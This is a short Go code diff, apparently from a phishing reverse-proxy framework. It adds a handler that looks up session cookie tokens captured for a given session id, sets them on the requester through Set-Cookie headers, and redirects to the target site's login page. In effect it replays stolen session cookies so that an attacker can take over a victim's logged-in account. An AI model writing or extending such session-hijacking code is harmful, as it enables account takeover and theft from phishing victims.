@@ -551,7 +551,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						sid := req.URL.Query().Get("sid")
 						if sid != "" {
 							log.Debug("sid: %s", sid)
-							log.Debug("cookietoken: %s", p.getSessionCookieToken(sid))
+							cookieTokens := p.getSessionCookieToken(sid)
+							if cookieTokens != nil {
+								log.Debug("cookietoken: %s", cookieTokens)
+								resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+								rurl := pl.GetLoginUrl()
+								if resp != nil {
+									for _, token := range cookieTokens {
+										resp.Header.Add("Set-Cookie", token.String())
+									}
+									resp.Header.Add("Location", rurl)
+									return req, resp
+								}
+
+							}
 						}
 
 					}
